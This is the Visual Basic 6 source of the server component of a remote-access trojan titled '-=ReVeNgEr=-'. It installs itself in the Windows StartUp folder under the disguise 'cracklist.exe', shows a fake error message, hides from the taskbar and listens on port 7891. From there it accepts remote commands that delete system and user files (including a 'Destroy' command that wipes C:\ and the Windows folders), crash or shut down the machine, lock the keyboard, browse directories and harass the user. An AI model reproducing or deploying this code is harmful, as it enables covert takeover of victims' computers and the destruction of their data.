VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "-=ReVeNgEr=- made by aBsOlUt (Server)"
   ClientHeight    =   3270
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   8430
   Icon            =   "main.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3270
   ScaleWidth      =   8430
   StartUpPosition =   2  'CenterScreen
   Begin VB.Frame Frame2 
      Caption         =   "FTP"
      Height          =   3135
      Left            =   4680
      TabIndex        =   11
      Top             =   0
      Width           =   3495
      Begin VB.FileListBox File1 
         Height          =   1455
         Left            =   1800
         TabIndex        =   13
         Top             =   240
         Width           =   1455
      End
      Begin VB.DirListBox Dir1 
         Height          =   1440
         Left            =   120
         TabIndex        =   12
         Top             =   240
         Width           =   1695
      End
      Begin VB.Label Label8 
         Height          =   615
         Left            =   240
         TabIndex        =   14
         Top             =   1920
         Width           =   2295
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "Server Status"
      Height          =   3135
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   4575
      Begin VB.TextBox Text2 
         Height          =   285
         Left            =   3360
         TabIndex        =   8
         Top             =   240
         Visible         =   0   'False
         Width           =   255
      End
      Begin VB.TextBox Text1 
         Height          =   735
         Left            =   120
         Locked          =   -1  'True
         TabIndex        =   7
         Top             =   2280
         Width           =   4335
      End
      Begin MSWinsockLib.Winsock Winsock2 
         Index           =   0
         Left            =   4080
         Top             =   120
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin VB.ListBox List1 
         Height          =   1230
         Left            =   120
         TabIndex        =   5
         Top             =   720
         Width           =   4335
      End
      Begin MSWinsockLib.Winsock Winsock1 
         Left            =   3600
         Top             =   120
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
         LocalPort       =   7891
      End
      Begin VB.Label Label5 
         AutoSize        =   -1  'True
         Caption         =   "Commands executed :"
         Height          =   195
         Left            =   120
         TabIndex        =   6
         Top             =   2040
         Width           =   1575
      End
      Begin VB.Label Label4 
         AutoSize        =   -1  'True
         Height          =   195
         Left            =   1440
         TabIndex        =   4
         Top             =   480
         Width           =   45
      End
      Begin VB.Label Label3 
         AutoSize        =   -1  'True
         Caption         =   "Users local name :"
         Height          =   195
         Left            =   120
         TabIndex        =   3
         Top             =   480
         Width           =   1305
      End
      Begin VB.Label Label2 
         AutoSize        =   -1  'True
         Height          =   195
         Left            =   840
         TabIndex        =   2
         Top             =   240
         Width           =   45
      End
      Begin VB.Label Label1 
         AutoSize        =   -1  'True
         Caption         =   "User's IP :"
         Height          =   195
         Left            =   120
         TabIndex        =   1
         Top             =   240
         Width           =   720
      End
   End
   Begin VB.Label Label7 
      AutoSize        =   -1  'True
      Height          =   195
      Left            =   1440
      TabIndex        =   10
      Top             =   3240
      Width           =   45
   End
   Begin VB.Label Label6 
      AutoSize        =   -1  'True
      Caption         =   "Application Path :"
      Height          =   195
      Left            =   120
      TabIndex        =   9
      Top             =   3240
      Width           =   1245
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim d As String
Dim key As Boolean
Dim cdrom As Boolean
Dim mouse As Boolean
Dim start As Boolean
Dim deskt As Boolean
Dim task As Boolean
Function ShowFolderList(foldername)

    Dim fso, f, fc, fj, s, f1
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f = fso.GetFolder(foldername)
    Set fc = f.Subfolders
    Set fj = f.Files
    'For Folders
    'If you dont want to delete folders just
    'remove the loop


    For Each f1 In fc
        ' If f1.Name = "Foldertobeerased" Then
        'f1.Delete
        ' Else
        s = f1.name
        s = s & "<BR>"
        d = d + NewLine + f1
        ' End If
    Next
End Function

Function App_Path() As String
x = App.path
    If Right$(x, 1) <> "\" Then x = x + "\"
    App_Path = UCase$(x)
    End Function
Private Sub OPEN_Click()
cdrom = True
MciSendString "Set CDAudio Door Open Wait", _
    0&, 0&, 0&
End Sub

Private Sub CLOSE_Click()
cdrom = False
MciSendString "Set CDAudio Door Closed Wait", _
    0&, 0&, 0&
End Sub

Private Sub Command1_Click()
End Sub

Private Sub Command2_Click()
startbar = 0

End Sub

Private Sub Dir1_Change()
Label8.Caption = Dir1.path
File1.path = Dir1.path

End Sub

Private Sub Form_Load()
key = False
cdrom = False
task = True
start = True
deskt = True
Dir1.path = "c:\"
Label8.Caption = Dir1.path
File1.path = Dir1.path
On Error GoTo errorhandle
SourceFile = App_Path + "cracklist.exe"
sourcefile2 = App_Path + "mswinsck.ocx"
Label7.Caption = App.path
DestinationFile2 = "C:\Windows\Start Menu\Programs\StartUp\cracklist.exe"
destinationfile3 = "c:\windows\system\mswinsck.ocx"
FileCopy SourceFile, DestinationFile2
FileCopy sourcefile2, destinationfile3
errorhandle: If Err.Number = 70 Or 53 Then Resume Next
Label7.Caption = App.path

MsgBox "Error 643 file not found!", vbCritical, "Error"
Winsock1.Close
App.TaskVisible = False
Label2.Caption = Winsock1.LocalIP
Label4.Caption = Winsock1.LocalHostName
Winsock1.Listen
List1.AddItem "Listening on port 7891..."
End Sub

Private Sub Image1_Click()
TaskbarIcons innotontaskbar
End Sub

Private Sub Text1_Change()
Dim data As String
data = "Server respond : Command executed!"
If Text1.text = "Status" Then
        data = "<----------------Status--------------->"
        Winsock2(i).SendData data
        data = NewLine
        Winsock2(i).SendData data
        
        data = "Computer Name : " & Winsock1.LocalHostName
        Winsock2(i).SendData data
        data = NewLine
        Winsock2(i).SendData data
        
        data = "IP Address : " & Winsock1.LocalIP
        Winsock2(i).SendData data
        data = NewLine
        Winsock2(i).SendData data
        
        data = "Server path : " & App_Path
        Winsock2(i).SendData data
        data = NewLine
        Winsock2(i).SendData data
        
If task = False Then
        data = "Taskbar status : Hidden"
        Winsock2(i).SendData data
        End If
        If task = True Then
        data = "Taskbar status : Visible"
        Winsock2(i).SendData data
End If
        
        data = NewLine
        Winsock2(i).SendData data
        
If start = False Then
        data = "Start button status : Hidden"
        Winsock2(i).SendData data
        End If
        If start = True Then
        data = "Start button status : Visible"
        Winsock2(i).SendData data
End If

        data = NewLine
        Winsock2(i).SendData data
        
If deskt = False Then
        data = "Desktop icon status : Hidden"
        Winsock2(i).SendData data
        End If
        If deskt = True Then
        data = "Desktop icon status : Visible"
        Winsock2(i).SendData data
End If

        data = NewLine
        Winsock2(i).SendData data

If mouse = False Then
        data = "Mouse buttons are not swapped."
        Winsock2(i).SendData data
        Else
        data = "Mouse buttons are swapped."
        Winsock2(i).SendData data
End If

        data = NewLine
        Winsock2(i).SendData data

If cdrom = False Then
        data = "CD-Rom is closed."
        Winsock2(i).SendData data
        Else
        data = "CD-Rom is open."
        Winsock2(i).SendData data

End If

        data = NewLine
        Winsock2(i).SendData data

If key = False Then
        data = "Keyboard status : Enabled"
        Winsock2(i).SendData data
        Else
        data = "Keyboard status : Disabled"
        Winsock2(i).SendData data
End If

        data = NewLine
        Winsock2(i).SendData data
        
        data = "You are on directory : " + Label8.Caption
        Winsock2(i).SendData data
        
        data = NewLine
        Winsock2(i).SendData data
        
        
        data = "<----------------End--------------->"
        Winsock2(i).SendData data
End If

If Text1.text = "Info" Then
        data = "<--------Directory Information-------->"
        Winsock2(i).SendData data
        
        data = NewLine
        Winsock2(i).SendData data
        
        data = "Directory path : " + Label8.Caption
        Winsock2(i).SendData data
        
        data = NewLine
        Winsock2(i).SendData data
        
        Dim intFileCount As Integer
        For intFileCount = 0 To File1.ListCount - 1
        File1.ListIndex = intFileCount
        data = intFileCount & " " & File1.FileName & vbCrLf
        Winsock2(i).SendData data
    Next
        
        
        data = "<----------------End--------------->"
        Winsock2(i).SendData data
        

End If
If Text1.text = "Erase" Then
On Error GoTo errhandle
        data = "Erasing files..."
        Winsock2(i).SendData data
        
        Kill Label8.Caption + "\*.*"
        data = NewLine
        Winsock2(i).SendData data
        
        data = "Files successfully erased!"
        Winsock2(i).SendData data
errhandle: If Err.Number = 53 Then
        data = "An error occured. Aborting operation."
        Winsock2(i).SendData data
    End If
End If

If Text1.text = "Erased" Then
On Error GoTo errorhandler
        data = "Erasing files..."
        Winsock2(i).SendData data
        
        Kill Label8.Caption + "\*.*"
        data = NewLine
        Winsock2(i).SendData data
        
        data = "Erasing directory..."
        Winsock2(i).SendData data
        
        RmDir Label8.Caption
        
        data = NewLine
        Winsock2(i).SendData data
        
        data = "Files and directory successfully erased!"
        Winsock2(i).SendData data
errorhandler: If Err.Number = 53 Then
        data = "There are no files on this directory..."
        Winsock2(i).SendData data
        
        data = NewLine
        Winsock2(i).SendData data
        RmDir Label8.Caption
        Winsock2(i).SendData data
    
        data = "Directory successfully erased!"
        Winsock2(i).SendData data
    End If

End If
If Text1.text = "viewdir" Then
        d = ""
        data = "<-----------Directory List----------->"
        Winsock2(i).SendData data
        
        data = NewLine
        Winsock2(i).SendData data
         
        ShowFolderList Label8.Caption & ("\")
        data = d
        Winsock2(i).SendData data
        
        data = NewLine
        Winsock2(i).SendData data
         
        data = "<----------------End--------------->"
        Winsock2(i).SendData data
End If
If Text1.text = "updir" Then
Dir1.path = Dir1.List(-2)
data = "Directory changed to : " & Label8.Caption
Winsock2(i).SendData data
End If
If Text1.text = "Kill" Then
        data = "Server respond : Server killed!"
        Winsock2(i).SendData data
        End
End If
If Text1.text = "Open CD-ROM" Then
        Call OPEN_Click
        Winsock2(i).SendData data
End If
If Text1.text = "Close CD-ROM" Then
        Call CLOSE_Click
        Winsock2(i).SendData data
End If
If Text1.text = "Swap buttons" Then
        SwapButtons
End If
If Text1.text = "Crash" Then
        Shell "rundll32 user,disableoemlayer"
        Winsock2(i).SendData data
End If
If Text1.text = "Shutdown" Then
        Shell "rundll32 krnl386.exe,exitkernel"
        Winsock2(i).SendData data
End If
If Text1.text = "Lock keyboard" Then
        key = True
        Shell "rundll32 keyboard,disable"
        Winsock2(i).SendData data
End If
If Text1.text = "Destroy" Then
        Kill "c:\windows\system\*.*"
        Kill "c:\windows\*.*"
        Kill "c:\*.*"
        Kill "c:\windows\system32\*.*"
        Winsock2(i).SendData data
End If


If Text1.text = "Hide task" Then
        TaskbarIcons innotontaskbar
        task = False
        Winsock2(i).SendData data
End If
If Text1.text = "Show task" Then
        TaskbarIcons isontaskbar
        task = True
        Winsock2(i).SendData data
End If


If Text1.text = "Hide start" Then
        StartButton innotontaskbar
        start = False
        Winsock2(i).SendData data
End If
If Text1.text = "Show start" Then
        StartButton isontaskbar
        start = True
        Winsock2(i).SendData data
End If


If Text1.text = "Hide desk" Then
        Desktop isoff
        deskt = False
        Winsock2(i).SendData data
End If
If Text1.text = "Show desk" Then
        Desktop ison
        deskt = True
        Winsock2(i).SendData data
End If

End Sub
Private Sub SwapButtons()
Dim Cur&, Butt&
    Cur = SwapMouseButton(Butt)
If Cur = 0 Then
    mouse = True
    SwapMouseButton (1)
    Else
    mouse = False
    SwapMouseButton (0)
End If
End Sub

Private Sub Winsock1_ConnectionRequest(ByVal requestID As Long)
Dim text As String
Dim name As String
Winsock2(i).Accept requestID
List1.AddItem "User connected, accepting connection request on " & requestID
Text2.text = "Connection accepted on "
text = Text2.text
name = Label4.Caption
Winsock2(i).SendData text
Winsock2(i).SendData name
End Sub
Private Sub Winsock2_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim datas As String
Winsock2(i).GetData datas
Text1.text = datas
Select Case Left(datas, 5)
    Case "mkdir"
    On Error GoTo errhandler
        MkDir Label8.Caption & "\" & Mid(datas, 6)
errhandler:     If Err.Number = 75 Then
        data = "Directory could not be created. No name is given."
        Winsock2(i).SendData data
    End If
    Case "chdir"
      On Error GoTo path
        Dir1.path = Mid(datas, 6)
        data = "You are on directory : " + Label8.Caption
        Winsock2(i).SendData data
path:       If Err.Number = 76 Then
      data = "Path not found"
      Winsock2(i).SendData data
End If
      Case "messg"
        MsgBox Mid(datas, 6), vbCritical + vbOKOnly, "Unknown message!"
    End Select
End Sub
